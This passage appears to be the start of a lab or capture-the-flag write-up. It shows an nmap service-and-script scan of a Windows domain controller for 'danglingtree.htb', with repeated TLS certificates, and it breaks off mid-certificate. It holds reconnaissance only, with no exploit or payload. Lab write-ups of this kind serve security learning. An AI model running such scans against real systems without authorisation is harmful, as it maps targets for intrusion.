### Nmap

```
nmap -sV -sC -vv 10.129.62.158

---OUTPUT---
Nmap scan report for 10.129.62.158
Host is up, received echo-reply ttl 127 (0.026s latency).
Scanned at 2026-08-11 05:23:09 EDT for 94s
Not shown: 986 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-08-11 16:23:24Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: danglingtree.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.danglingtree.htb, DNS:danglingtree.htb, DNS:DANGLINGTREE
| Issuer: commonName=danglingtree-DC-CA/domainComponent=danglingtree
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-08-03T16:32:53
| Not valid after:  2106-08-03T16:32:53
| MD5:     8267 2fbc 2f8c 4d51 5f85 1b63 bbb3 5a40
| SHA-1:   d657 81fd 541a cd7e af8b 1a69 150f 1a29 9336 5f71
| SHA-256: 64ea 2599 3558 b856 1c71 bcde bf7a a71a fdbc b48e f17f c991 d47e 9f2c 8326 1222
| -----BEGIN CERTIFICATE-----
| MIIHGTCCBQGgAwIBAgITHgAAAA5tmFJzZxJYSAACAAAADjANBgkqhkiG9w0BAQsF
| ADBQMRMwEQYKCZImiZPyLGQBGRYDaHRiMRwwGgYKCZImiZPyLGQBGRYMZGFuZ2xp
| bmd0cmVlMRswGQYDVQQDExJkYW5nbGluZ3RyZWUtREMtQ0EwIBcNMjYwODAzMTYz
| MjUzWhgPMjEwNjA4MDMxNjMyNTNaMAAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw
| ggEKAoIBAQDIFSfKc9nKTCbcoXvqqMSR2JKaHm2wdVOKPHLC0mNjgD5kZ2xh6gyk
| yTW6im2DeZozH+jUj/N8dVLGX45Y9gRyoNfJYxgN54n4sjBMeri9UNNO+qb3qcRY
| zPhQpC5tCOfzY/gjJysrr1MMFIaqAr4USJnQMNh6spj3jwi4eU7aI5bGIw31JaKK
| oi3fC2AGHlkC6/p4JeoddiRmKEKDcvpRlYz27zL/LGjlh8dvvBJtggYD/FqkhVRC
| JFYJONlUimD91mfuxxC4EVXgztxgXb8ihjcLCe9ljvvwKm6nTxnvI4UM22OdUNYx
| 8gGhu277u6j9pGouvtnLRgrJJJjBtVIVAgMBAAGjggM4MIIDNDA4BgkrBgEEAYI3
| FQcEKzApBiErBgEEAYI3FQiGpuR/h4aIAIWRgQuF84N4hYuqEIEuASECAW4CAQAw
| MgYDVR0lBCswKQYIKwYBBQUHAwIGCCsGAQUFBwMBBgorBgEEAYI3FAICBgcrBgEF
| AgMFMA4GA1UdDwEB/wQEAwIFoDBABgkrBgEEAYI3FQoEMzAxMAoGCCsGAQUFBwMC
| MAoGCCsGAQUFBwMBMAwGCisGAQQBgjcUAgIwCQYHKwYBBQIDBTAdBgNVHQ4EFgQU
| k4tSu/hOt7O7lCPAYc+e2rFfpHswHwYDVR0jBBgwFoAUwPV9rSFUxXDPdasEyWV4
| lVeHzRowgdMGA1UdHwSByzCByDCBxaCBwqCBv4aBvGxkYXA6Ly8vQ049ZGFuZ2xp
| bmd0cmVlLURDLUNBKDIpLENOPWRjLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBT
| ZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWRhbmdsaW5n
| dHJlZSxEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVj
| dENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHJBggrBgEFBQcBAQSBvDCBuTCB
| tgYIKwYBBQUHMAKGgalsZGFwOi8vL0NOPWRhbmdsaW5ndHJlZS1EQy1DQSxDTj1B
| SUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29u
| ZmlndXJhdGlvbixEQz1kYW5nbGluZ3RyZWUsREM9aHRiP2NBQ2VydGlmaWNhdGU/
| YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEEGA1UdEQEB
| /wQ3MDWCE2RjLmRhbmdsaW5ndHJlZS5odGKCEGRhbmdsaW5ndHJlZS5odGKCDERB
| TkdMSU5HVFJFRTBNBgkrBgEEAYI3GQIEQDA+oDwGCisGAQQBgjcZAgGgLgQsUy0x
| LTUtMjEtNDIyMDIzODMzMi01NzAyMzcyOC0xMTI5MTEwNjQ2LTEwMDAwDQYJKoZI
| hvcNAQELBQADggIBAAHAz84BKh0DGMV9YEg2L/ddBbp5GTj1R5xSmOt9nFGb4UDO
| 96HOFHq1rnlFswd9oEAz+gG4bIt6CiLQ+/EFEf1O8cBiDTAsS3F16ffF+dvdRwCM
| oU7RBx2Tc3gQOLRFysfZ5QabG189CcneKoz9qTt7nWfX5Zj/xeR8Vn3aDv0J9h72
| DVu67Prh9QR85dur8aq62G4BdpnhpleWkIrVTahvZvk+ZdQ6mo98lMDVt13ILX/o
| jJ8nTE5Pe1JMqyjnjPn++1JSqDLUbxvXPWaQZbnc3NZRGWWC6DfaaiIqTTAFSk68
| bfYHNu8PDPGWgeNhzYSSCNbeHVfx/qp474ITfIwMY2DxJBcbXLFFKgFsawKi7Aza
| bsFq16tMSTcQjRrJaXaB9yDKry57lwtGAlRJaVzQXZ4lW49eYcwJC5fHIOAftCZ/
| 0VYS8H7TR9+2e2m/UY83JX965+fmVbh5VfFPhKgow5clTLDE2cJ2i1RLMwaRCHSn
| kWYFWuhlBHD3YGNMlXILXF32w2WbeJCLGIQV8o8KUTbKOBRoAwaV35bsECanZ+sI
| l1m1fqiq7Bruu+ftv7dP9dOHW0ZFnXeMWW4UAo/JGdY0AlHd/P3quZkEQv+OP3IT
| wbON87Eu+ImljefcU5kALJZCGWIBpNBowe490QkpoLwPiG9WXqgWkf/JBMYy
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
443/tcp  open  ssl/https?    syn-ack ttl 127
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=danglingtree-DC-CA/domainComponent=danglingtree
| Issuer: commonName=danglingtree-DC-CA/domainComponent=danglingtree
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-03-26T05:34:19
| Not valid after:  2114-03-26T05:44:18
| MD5:     9054 595f c5e0 bb67 628f f4fc 8d82 a8cf
| SHA-1:   9733 440c 1fd9 f7c9 db9e d4e8 69b7 7b8e 8e71 7781
| SHA-256: fb01 7a29 c4a9 3bee db84 2c1d 77e4 6cd3 d00b 89d8 8229 a712 c4ca db44 3678 29a0
| -----BEGIN CERTIFICATE-----
| MIIFfTCCA2WgAwIBAgIQYN9cBM7vHJBM3yjtuX75JTANBgkqhkiG9w0BAQsFADBQ
| MRMwEQYKCZImiZPyLGQBGRYDaHRiMRwwGgYKCZImiZPyLGQBGRYMZGFuZ2xpbmd0
| cmVlMRswGQYDVQQDExJkYW5nbGluZ3RyZWUtREMtQ0EwIBcNMjYwMzI2MDUzNDE5
| WhgPMjExNDAzMjYwNTQ0MThaMFAxEzARBgoJkiaJk/IsZAEZFgNodGIxHDAaBgoJ
| kiaJk/IsZAEZFgxkYW5nbGluZ3RyZWUxGzAZBgNVBAMTEmRhbmdsaW5ndHJlZS1E
| Qy1DQTCCAiIwDQYJKoZIhvcNAQEBBQADggIPADCCAgoCggIBAMJ9plR3FhO4uCPr
| KwPVczpDESlGUS0RXjy8gITNqdO3VBNi63XOAjn9FjbBw3VGWQvxUoZfX4/RfS9B
| PnHu1y92fnYYYU7ZPOCtvY99/exopF7BZa4ewQtrL5ZhUP4qTw17ZYknZ82a9fca
| k1AhF0w7oTcEW38TnsSUZRthgcHLfk7EN+bm2z5lm23eTNBftiEiUdtY3hz4QofW
| AtTGoRAatWVxHbwFFdbHiNPJNB6CF1zRYY96mhxrFb38uRI59sn8XNNlU79vVwQo
| Cw5f5IS0RTd7uOXt03w3mbESatPaLn3sOey8k/U80PjiOyQZmj/9GrwCqrUWWyan
| z2NjEEQepjlHc9mAyfnbmPo4Qcf2LohY0DiJZaEfcnyXaTbEGvJv+VRp86KZ6+Im
| E1CP+sflfd1aKk5urs5gkXHDs15oYP7LGAtr4uJbjPOxinGc3UEVdAS91myB1zCX
| iZOFigZIFu3tEOWRwS1GGseoS+LgTLnFaoo1ck1ylkxT18ud/W+Knn2oU/BmsxjM
| cdmMDCr+J6rwA2rHmgQaP4wUOkbPkc7xdjOiQyk+WIsSX53VJqUmkfjrl1Td0zRM
| +vekyNRGaCpvGQidafmwP7acA74XJ8+vD/NyMvBpHyktswXXh0tlotmZhBtEnueN
| Lbo09H2InBKZ6DNQx9D3a7jBds89AgMBAAGjUTBPMAsGA1UdDwQEAwIBhjAPBgNV
| HRMBAf8EBTADAQH/MB0GA1UdDgQWBBSC4b8HPDULHkkU0zHggJopP00e9TAQBgkr
| BgEEAYI3FQEEAwIBADANBgkqhkiG9w0BAQsFAAOCAgEAq/8Xg7bG3KX/WDKUl9ff
| XMAsjh3wkta3X6sWCKeqshEb1yz9T+N9NSUEul0HaJlvSErMvQqVDQyOs9k2rgzw
| 3hL4EJaeyYIln+9itkkdIQecfbTwPPxqDeJAFaOqDv5JZ7ypo3Lr5AflvC9U+4+4
| SGfqr8PVhoSktFgDp9VP4cZfoi6EhTvxHJ/ZMeHVv6Ky6QtzCdeH1fs/aEGQ71D3
| Tc/Mwacf1A3YQCVDp9B3MQ6jbNOoE3qaGuRHvK0tjkFfKR72CrA0GYe4E9gyqPmo
| T6IJhcV4JfozTbya1R3A2pSdpt2Skxh7vxQQ1uAUp/iZ5ThhzaG+PIwYmfl05Daq
| aPhm5hE3clCdoMZHjcfIf+5sw+W8LqNUxaIxNVuK61Oh1H4QKMkhTPNTX80Nz99N
| L+4JrWnD5mV33FhpZXbbZdzDsCGgqrLiNAufceyWsrRAgfOIq12UL1VhaY9CLXKT
| YJ4jmKrnmwd29oeHvZTXWosXCgOoU0pPPuFwxqDVxd9ctiC/xMnTRf4o6D+SvApR
| KoubwtRGV0pqjbvEVcTwYb2oxL9uIa9ecQeHfWzKFiqdyYBrQw+M/dH8z/wqo76q
| bDxec0o/QfgPZSzVKh9u9AGV8fKmG0aqhdh4iWn8GUBQTsiBeCdL1E1RT55lN4k/
| THnYKHaL8sIUizOeG6eZHbY=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: danglingtree.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.danglingtree.htb, DNS:danglingtree.htb, DNS:DANGLINGTREE
| Issuer: commonName=danglingtree-DC-CA/domainComponent=danglingtree
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-08-03T16:32:53
| Not valid after:  2106-08-03T16:32:53
| MD5:     8267 2fbc 2f8c 4d51 5f85 1b63 bbb3 5a40
| SHA-1:   d657 81fd 541a cd7e af8b 1a69 150f 1a29 9336 5f71
| SHA-256: 64ea 2599 3558 b856 1c71 bcde bf7a a71a fdbc b48e f17f c991 d47e 9f2c 8326 1222
| -----BEGIN CERTIFICATE-----
| MIIHGTCCBQGgAwIBAgITHgAAAA5tmFJzZxJYSAACAAAADjANBgkqhkiG9w0BAQsF
| ADBQMRMwEQYKCZImiZPyLGQBGRYDaHRiMRwwGgYKCZImiZPyLGQBGRYMZGFuZ2xp
| bmd0cmVlMRswGQYDVQQDExJkYW5nbGluZ3RyZWUtREMtQ0EwIBcNMjYwODAzMTYz
| MjUzWhgPMjEwNjA4MDMxNjMyNTNaMAAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw
| ggEKAoIBAQDIFSfKc9nKTCbcoXvqqMSR2JKaHm2wdVOKPHLC0mNjgD5kZ2xh6gyk
| yTW6im2DeZozH+jUj/N8dVLGX45Y9gRyoNfJYxgN54n4sjBMeri9UNNO+qb3qcRY
| zPhQpC5tCOfzY/gjJysrr1MMFIaqAr4USJnQMNh6spj3jwi4eU7aI5bGIw31JaKK
| oi3fC2AGHlkC6/p4JeoddiRmKEKDcvpRlYz27zL/LGjlh8dvvBJtggYD/FqkhVRC
| JFYJONlUimD91mfuxxC4EVXgztxgXb8ihjcLCe9ljvvwKm6nTxnvI4UM22OdUNYx
| 8gGhu277u6j9pGouvtnLRgrJJJjBtVIVAgMBAAGjggM4MIIDNDA4BgkrBgEEAYI3
| FQcEKzApBiErBgEEAYI3FQiGpuR/h4aIAIWRgQuF84N4hYuqEIEuASECAW4CAQAw
| MgYDVR0lBCswKQYIKwYBBQUHAwIGCCsGAQUFBwMBBgorBgEEAYI3FAICBgcrBgEF
| AgMFMA4GA1UdDwEB/wQEAwIFoDBABgkrBgEEAYI3FQoEMzAxMAoGCCsGAQUFBwMC
| MAoGCCsGAQUFBwMBMAwGCisGAQQBgjcUAgIwCQYHKwYBBQIDBTAdBgNVHQ4EFgQU
| k4tSu/hOt7O7lCPAYc+e2rFfpHswHwYDVR0jBBgwFoAUwPV9rSFUxXDPdasEyWV4
| lVeHzRowgdMGA1UdHwSByzCByDCBxaCBwqCBv4aBvGxkYXA6Ly8vQ049ZGFuZ2xp
| bmd0cmVlLURDLUNBKDIpLENOPWRjLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBT
| ZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWRhbmdsaW5n
| dHJlZSxEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVj
| dENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHJBggrBgEFBQcBAQSBvDCBuTCB
| tgYIKwYBBQUHMAKGgalsZGFwOi8vL0NOPWRhbmdsaW5ndHJlZS1EQy1DQSxDTj1B
| SUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29u
| ZmlndXJhdGlvbixEQz1kYW5nbGluZ3RyZWUsREM9aHRiP2NBQ2VydGlmaWNhdGU/
| YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEEGA1UdEQEB
| /wQ3MDWCE2RjLmRhbmdsaW5ndHJlZS5odGKCEGRhbmdsaW5ndHJlZS5odGKCDERB
| TkdMSU5HVFJFRTBNBgkrBgEEAYI3GQIEQDA+oDwGCisGAQQBgjcZAgGgLgQsUy0x
| LTUtMjEtNDIyMDIzODMzMi01NzAyMzcyOC0xMTI5MTEwNjQ2LTEwMDAwDQYJKoZI
| hvcNAQELBQADggIBAAHAz84BKh0DGMV9YEg2L/ddBbp5GTj1R5xSmOt9nFGb4UDO
| 96HOFHq1rnlFswd9oEAz+gG4bIt6CiLQ+/EFEf1O8cBiDTAsS3F16ffF+dvdRwCM
| oU7RBx2Tc3gQOLRFysfZ5QabG189CcneKoz9qTt7nWfX5Zj/xeR8Vn3aDv0J9h72
| DVu67Prh9QR85dur8aq62G4BdpnhpleWkIrVTahvZvk+ZdQ6mo98lMDVt13ILX/o
| jJ8nTE5Pe1JMqyjnjPn++1JSqDLUbxvXPWaQZbnc3NZRGWWC6DfaaiIqTTAFSk68
| bfYHNu8PDPGWgeNhzYSSCNbeHVfx/qp474ITfIwMY2DxJBcbXLFFKgFsawKi7Aza
| bsFq16tMSTcQjRrJaXaB9yDKry57lwtGAlRJaVzQXZ4lW49eYcwJC5fHIOAftCZ/
| 0VYS8H7TR9+2e2m/UY83JX965+fmVbh5VfFPhKgow5clTLDE2cJ2i1RLMwaRCHSn
| kWYFWuhlBHD3YGNMlXILXF32w2WbeJCLGIQV8o8KUTbKOBRoAwaV35bsECanZ+sI
| l1m1fqiq7Bruu+ftv7dP9dOHW0ZFnXeMWW4UAo/JGdY0AlHd/P3quZkEQv+OP3IT
| wbON87Eu+ImljefcU5kALJZCGWIBpNBowe490QkpoLwPiG9WXqgWkf/JBMYy
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: danglingtree.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.danglingtree.htb, DNS:danglingtree.htb, DNS:DANGLINGTREE
| Issuer: commonName=danglingtree-DC-CA/domainComponent=danglingtree
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-08-03T16:32:53
| Not valid after:  2106-08-03T16:32:53
| MD5:     8267 2fbc 2f8c 4d51 5f85 1b63 bbb3 5a40
| SHA-1:   d657 81fd 541a cd7e af8b 1a69 150f 1a29 9336 5f71
| SHA-256: 64ea 2599 3558 b856 1c71 bcde bf7a a71a fdbc b48e f17f c991 d47e 9f2c 8326 1222
| -----BEGIN CERTIFICATE-----
| MIIHGTCCBQGgAwIBAgITHgAAAA5tmFJzZxJYSAACAAAADjANBgkqhkiG9w0BAQsF
| ADBQMRMwEQYKCZImiZPyLGQBGRYDaHRiMRwwGgYKCZImiZPyLGQBGRYMZGFuZ2xp
| bmd0cmVlMRswGQYDVQQDExJkYW5nbGluZ3RyZWUtREMtQ0EwIBcNMjYwODAzMTYz
| MjUzWhgPMjEwNjA4MDMxNjMyNTNaMAAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw
| ggEKAoIBAQDIFSfKc9nKTCbcoXvqqMSR2JKaHm2wdVOKPHLC0mNjgD5kZ2xh6gyk
| yTW6im2DeZozH+jUj/N8dVLGX45Y9gRyoNfJYxgN54n4sjBMeri9UNNO+qb3qcRY
| zPhQpC5tCOfzY/gjJysrr1MMFIaqAr4USJnQMNh6spj3jwi4eU7aI5bGIw31JaKK
| oi3fC2AGHlkC6/p4JeoddiRmKEKDcvpRlYz27zL/LGjlh8dvvBJtggYD/FqkhVRC
| JFYJONlUimD91mfuxxC4EVXgztxgXb8ihjcLCe9ljvvwKm6nTxnvI4UM22OdUNYx
| 8gGhu277u6j9pGouvtnLRgrJJJjBtVIVAgMBAAGjggM4MIIDNDA4BgkrBgEEAYI3
| FQcEKzApBiErBgEEAYI3FQiGpuR/h4aIAIWRgQuF84N4hYuqEIEuASECAW4CAQAw
| MgYDVR0lBCswKQYIKwYBBQUHAwIGCCsGAQUFBwMBBgorBgEEAYI3FAICBgcrBgEF
| AgMFMA4GA1UdDwEB/wQEAwIFoDBABgkrBgEEAYI3FQoEMzAxMAoGCCsGAQUFBwMC
| MAoGCCsGAQUFBwMBMAwGCisGAQQBgjcUAgIwCQYHKwYBBQIDBTAdBgNVHQ4EFgQU
| k4tSu/hOt7O7lCPAYc+e2rFfpHswHwYDVR0jBBgwFoAUwPV9rSFUxXDPdasEyWV4
| lVeHzRowgdMGA1UdHwSByzCByDCBxaCBwqCBv4aBvGxkYXA6Ly8vQ049ZGFuZ2xp
| bmd0cmVlLURDLUNBKDIpLENOPWRjLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBT
| ZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWRhbmdsaW5n
| dHJlZSxEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVj
| dENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHJBggrBgEFBQcBAQSBvDCBuTCB
| tgYIKwYBBQUHMAKGgalsZGFwOi8vL0NOPWRhbmdsaW5ndHJlZS1EQy1DQSxDTj1B
| SUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29u
| ZmlndXJhdGlvbixEQz1kYW5nbGluZ3RyZWUsREM9aHRiP2NBQ2VydGlmaWNhdGU/
| YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEEGA1UdEQEB
| /wQ3MDWCE2RjLmRhbmdsaW5ndHJlZS5odGKCEGRhbmdsaW5ndHJlZS5odGKCDERB
| TkdMSU5HVFJFRTBNBgkrBgEEAYI3GQIEQDA+oDwGCisGAQQBgjcZAgGgLgQsUy0x
| LTUtMjEtNDIyMDIzODMzMi01NzAyMzcyOC0xMTI5MTEwNjQ2LTEwMDAwDQYJKoZI
| hvcNAQELBQADggIBAAHAz84BKh0DGMV9YEg2L/ddBbp5GTj1R5xSmOt9nFGb4UDO
| 96HOFHq1rnlFswd9oEAz+gG4bIt6CiLQ+/EFEf1O8cBiDTAsS3F16ffF+dvdRwCM
| oU7RBx2Tc3gQOLRFysfZ5QabG189CcneKoz9qTt7nWfX5Zj/xeR8Vn3aDv0J9h72
| DVu67Prh9QR85dur8aq62G4BdpnhpleWkIrVTahvZvk+ZdQ6mo98lMDVt13ILX/o
| jJ8nTE5Pe1JMqyjnjPn++1JSqDLUbxvXPWaQZbnc3NZRGWWC6DfaaiIqTTAFSk68
| bfYHNu8PDPGWgeNhzYSSCNbeHVfx/qp474ITfIwMY2DxJBcbXLFFKgFsawKi7Aza
| bsFq16tMSTcQjRrJaXaB9yDKry57lwtGAlRJaVzQXZ4lW49eYcwJC5fHIOAftCZ/
| 0VYS8H7TR9+2e2m/UY83JX965+fmVbh5VfFPhKgow5clTLDE2cJ2i1RLMwaRCHSn
| kWYFWuhlBHD3YGNMlXILXF32w2WbeJCLGIQV8o8KUTbKOBRoAwaV35bsECanZ+sI
| l1m1fqiq7Bruu+ftv7dP9dOHW0ZFnXeMWW4UAo/JGdY0AlHd/P3quZkEQv+OP3IT
| wbON87Eu+ImljefcU5kALJZCGWIBpNBowe490QkpoLwPiG9WXqgWkf/JBMYy
|_-----END CERTIFICATE-----
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: danglingtree.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.danglingtree.htb, DNS:danglingtree.htb, DNS:DANGLINGTREE
| Issuer: commonName=danglingtree-DC-CA/domainComponent=danglingtree
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-08-03T16:32:53
| Not valid after:  2106-08-03T16:32:53
| MD5:     8267 2fbc 2f8c 4d51 5f85 1b63 bbb3 5a40
| SHA-1:   d657 81fd 541a cd7e af8b 1a69 150f 1a29 9336 5f71
| SHA-256: 64ea 2599 3558 b856 1c71 bcde bf7a a71a fdbc b48e f17f c991 d47e 9f2c 8326 1222
| -----BEGIN CERTIFICATE-----
| MIIHGTCCBQGgAwIBAgITHgAAAA5tmFJzZxJYSAACAAAADjANBgkqhkiG9w0BAQsF
| ADBQMRMwEQYKCZImiZPyLGQBGRYDaHRiMRwwGgYKCZImiZPyLGQBGRYMZGFuZ2xp
| bmd0cmVlMRswGQYDVQQDExJkYW5nbGluZ3RyZWUtREMtQ0EwIBcNMjYwODAzMTYz
| MjUzWhgPMjEwNjA4MDMxNjMyNTNaMAAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw
| ggEKAoIBAQDIFSfKc9nKTCbcoXvqqMSR2JKaHm2wdVOKPHLC0mNjgD5kZ2xh6gyk
| yTW6im2DeZozH+jUj/N8dVLGX45Y9gRyoNfJYxgN54n4sjBMeri9UNNO+qb3qcRY
| zPhQpC5tCOfzY/gjJysrr1MMFIaqAr4USJnQMNh6spj3jwi4eU7aI5bGIw31JaKK
| oi3fC2AGHlkC6/p4JeoddiRmKEKDcvpRlYz27zL/LGjlh8dvvBJtggYD/FqkhVRC
| JFYJONlUimD91mfuxxC4EVXgztxgXb8ihjcLCe9ljvvwKm6nTxnvI4UM22OdUNYx
| 8gGhu277u6j9pGouvtnLRgrJJJjBtVIVAgMBAAGjggM4MIIDNDA4BgkrBgEEAYI3
| FQcEKzApBiErBgEEAYI3FQiGpuR/h4aIAIWRgQuF84N4hYuqEIEuASECAW4CAQAw
| MgYDVR0lBCswKQYIKwYBBQUHAwIGCCsGAQUFBwMBBgorBgEEAYI3FAICBgcrBgEF
| AgMFMA4GA1UdDwEB/wQEAwIFoDBABgkrBgEEAYI3FQoEMzAxMAoGCCsGAQUFBwMC
| MAoGCCsGAQUFBwMBMAwGCisGAQQBgjcUAgIwCQYHKwYBBQIDBTAdBgNVHQ4EFgQU
| k4tSu/hOt7O7lCPAYc+e2rFfpHswHwYDVR0jBBgwFoAUwPV9rSFUxXDPdasEyWV4
| lVeHzRowgdMGA1UdHwSByzCByDCBxaCBwqCBv4aBvGxkYXA6Ly8vQ049ZGFuZ2xp
| bmd0cmVlLURDLUNBKDIpLENOPWRjLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBT
| ZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWRhbmdsaW5n
| dHJlZSxEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVj
| dENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHJBggrBgEFBQcBAQSBvDCBuTCB
| tgYIKwYBBQUHMAKGgalsZGFwOi8vL0NOPWRhbmdsaW5ndHJlZS1EQy1DQSxDTj1B
| SUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29u
| ZmlndXJhdGlvbixEQz1kYW5nbGluZ3RyZWUsREM9aHRiP2NBQ2VydGlmaWNhdGU/
| YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEEGA1UdEQEB
| /wQ3MDWCE2RjLmRhbmdsaW5ndHJlZS5odGKCEGRhbmdsaW5ndHJlZS5odGKCDERB
| TkdMSU5HVFJFRTBNBgkrBgEEAYI3GQIEQDA+oDwGCisGAQQBgjcZAgGgLgQsUy0x
| LTUtMjEtNDIyMDIzODMzMi01NzAyMzcyOC0xMTI5MTEwNjQ2LTEwMDAwDQYJKoZI
| hvcNAQELBQADggIBAAHAz84BKh0DGMV9YEg2L/ddBbp5GTj1R5xSmOt9nFGb4UDO
| 96HOFHq1rnlFswd9oEAz+gG4bIt6CiLQ+/EFEf1O8cBiDTAsS3F16ffF+dvdRwCM
| oU7RBx2Tc3gQOLRFysfZ5QabG189CcneKoz9qTt7nWfX5Zj/xeR8Vn3aDv0J9h72
| DVu67Prh9QR85dur8aq62G4BdpnhpleWkIrVTahvZvk+ZdQ6mo98lMDVt13ILX/o
| jJ8nTE5Pe1JMqyjnjPn++1JSqDLUbxvXPWaQZbnc3NZRGWWC6DfaaiIqTTAFSk68
| bfYHNu8PDPGWgeNhzYSSCNbeHVfx/qp474ITfIwMY2DxJBcbXLFFKgFsawKi7Aza
| bsFq16tMSTcQjRrJaXaB9yDKry57lwtGAlRJaVzQXZ4lW49eYcwJC5fHIOAftCZ/
| 0VYS8H7TR9+2e2m/UY83JX965+fmVbh5VfFPhKgow5clTLDE2cJ2i1RLMwaRCHSn
| kWYFWuhlBHD3YGNMlXILXF32w2WbeJCLGIQV8o8KUTbKOBRoAwaV35bsECanZ+sI
| l1m1fqiq7Bruu+ftv7dP9dOHW0ZFnXeMWW4UAo/JGdY0AlHd/P3quZkEQv+OP3IT
| wbON87Eu+ImljefcU5kALJZCGWIBpNBowe490QkpoLwPiG9WXqgWkf/JBMYy
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3389/tcp open  ms-wbt-server syn-ack ttl 127
| ssl-cert: Subject: commonName=dc.danglingtree.htb
| Issuer: commonName=dc.danglingtree.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-03-25T05:48:29
| Not valid after:  2026-09-24T05:48:29
| MD5:     4599 496f 7b7e 5e3a 060b b62f 49a6 0f04
| SHA-1:   c841 e9c4 c71c 273c 11ae 36e3 6a6e 80d5 44f5 695c
| SHA-256: 2f56 67eb 1671 b5ad e87f 4c92 4480 2d42 1149 08c4 488e 8b22 954c 5cc3 2da3 9017
| -----BEGIN CERTIFICATE-----
| MIIC6jCCAdKgAwIBAgIQEVbFS9jYO4hAnZHZVOnxNzANBgkqhkiG9w0BAQsFADAe
| MRwwGgYDVQQDExNkYy5kYW5nbGluZ3RyZWUuaHRiMB4XDTI2MDMyNTA1NDgyOVoX
| DTI2MDkyNDA1NDgyOVowHjEcMBoGA1UEAxMTZGMuZGFuZ2xpbmd0cmVlLmh0YjCC
| ASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMpljSbPqpWEDi6pIv/CJk5g
| f7K9zUJqpjSwY5xd+E8yor06tjZRAKdYbRrEnfpAg7k77lxNaFgByW9BZxz3rtTl
